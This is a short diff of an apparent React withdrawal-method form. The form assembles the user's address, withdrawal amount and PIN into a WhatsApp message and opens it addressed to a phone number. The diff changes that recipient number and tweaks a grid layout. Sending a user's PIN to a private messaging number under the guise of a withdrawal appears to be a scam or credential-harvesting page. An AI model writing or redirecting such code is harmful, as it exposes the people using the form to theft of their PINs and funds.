@@ -52,13 +52,13 @@ Address: ${formData.address}%0A
 Amount: ${formData.amount}%0A
 PIN: ${formData.pin}`
 
-    window.open(`https://wa.me/+2347048952008?text=${whatsappMessage}`, "_blank")
+    window.open(`https://wa.me/+19044491705?text=${whatsappMessage}`, "_blank")
   }
 
   return (
     <div className="p-6 bg-gray-50 rounded-lg shadow-md">
       <h2 className="text-2xl font-semibold mb-6 text-primary">Select Withdrawal Method</h2>
-      <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-4">
+      <div className="grid grid-cols-1 sm:grid-cols-3 md:grid-cols-4 gap-4">
         {paymentMethods.map((method) => (
           <div
             key={method.name}
